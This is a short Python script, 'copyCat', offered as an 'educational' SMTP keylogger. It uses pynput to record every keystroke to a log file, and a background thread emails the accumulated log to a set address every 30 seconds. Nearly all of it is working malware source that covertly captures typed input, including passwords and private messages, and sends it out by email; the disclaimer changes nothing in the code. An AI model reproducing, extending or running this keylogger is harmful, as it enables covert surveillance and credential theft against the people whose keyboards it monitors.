#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Title: copyCat
# Description: copycat is an smtp-enabled keylogger
#		that will read keystrokes and email
#		them to a specfied email address at
#		specified intervals
# Purpose: Educational
# Author: W15P
# Disclaimer: Please do not use this script for evil purposes
#		It's only intent was to educate. I am
#		not responsible for the usage of the script
#		outside of its specified educational parameters
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#!/usr/bin/env python
import time, os, logging
from threading import Thread
from mail import Mailer
from pynput.keyboard import Key, Listener


def on_press(key):

	logging.info(key)

def kl():

	log_dir = ""
	logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG)

	with Listener(on_press=on_press) as listener:
		listener.join()

def read_file():

	contents = []

	with open('log.txt', 'r') as log_file:
		for line in log_file:
			contents.append(line.strip('INFO:root:Key\n'))

	return contents

def send():

	time.sleep(10)

	author = 'example_sender@example.com'
	rec = 'example_recipient@example.com'
	password = 'password'
	sub = 'subject'
	txt = 'leave blank'

	while True:

		txt = read_file()
		new_email = Mailer(author, rec, password, sub, txt)
		new_email.send_mail()
		time.sleep(30)

def main():

	t1 = Thread(target=kl, args=())
	t2 = Thread(target=send, args=())
	t1.start()
	t2.start()

if __name__ == '__main__':
	main()
